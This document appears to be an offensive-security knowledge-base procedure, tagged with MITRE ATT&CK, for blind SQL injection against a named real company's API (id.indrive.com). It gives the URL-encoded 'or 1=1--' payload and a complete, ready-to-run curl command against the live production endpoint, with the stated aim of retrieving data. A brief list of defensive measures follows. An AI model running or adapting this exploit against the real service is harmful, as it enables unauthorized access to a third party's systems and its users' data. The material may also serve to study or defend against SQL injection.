---
tags:
  - blind-sqli
  - injection
  - web
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-blind-sqli-true-condition]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
id: 5cc1b87e-db82-4c25-abb4-f1556b14239e
created_at: '2025-12-14T03:15:10.054Z'
updated_at: '2025-12-14T03:15:10.054Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Inject-True-SQL-Condition-via-Curl

## Summary

This procedure injects a true SQL condition into the API URL path to elicit a non-empty response, confirming the blind SQLi vulnerability.

## Description

In the inDrive API, the path parameter is directly concatenated into a SQL query without sanitization. Injecting 'or 1=1--' makes the WHERE clause always true, causing the query to return a random entry. This boolean-based technique relies on response differences in a web/PostgreSQL environment.

## Requirements

1. Access to curl tool
2. Network connectivity to id.indrive.com
3. Knowledge of original endpoint path

## Defense

Defensive measures and detection strategies:

- Parameterize all SQL queries using prepared statements
- Validate and sanitize URL path inputs
- Monitor for anomalous response sizes or patterns

## Objectives

1. Confirm SQL injection point
2. Observe true condition behavior
3. Retrieve sample data for validation

## Instructions

### Step 1: Prepare the Payload

**Context**: URL-encode the SQL payload to inject into the path.

**Instructions**: Use '999%20or%201=1--' where %20 is space, and -- comments out the rest.

> This alters the query to SELECT * FROM table WHERE id=1 OR 1=1 --, returning data.

### Step 2: Execute Injection

**Context**: Send the modified GET request mimicking browser headers.

**Command** ([[commands/curl-blind-sqli-true-condition]]):
```bash
curl -i -s -k -X GET -H 'Host: id.indrive.com' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0' -H 'Accept: application/json, text/plain, */*' -H 'Accept-Language: en-US,en;q=0.5' -H 'Accept-Encoding: gzip, deflate' -H 'Origin: https://promo.indrive.com' -H 'Referer: https://promo.indrive.com/' -H 'Sec-Fetch-Dest: empty' -H 'Sec-Fetch-Mode: cors' -H 'Sec-Fetch-Site: same-site' -H 'Te: trailers' -H 'Connection: close' 'https://id.indrive.com/api/ten-drives/custom-winners/ten_drive_kz_second_weeks/number_trips/1/999%20or%201=1--'
```

> The command sends a request to the injected URL, expecting a JSON response with data.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-blind-sqli-true-condition]]

## Tools Used

- [[tools/curl]]

## Tags

- [[blind-sqli]]
- [[injection]]
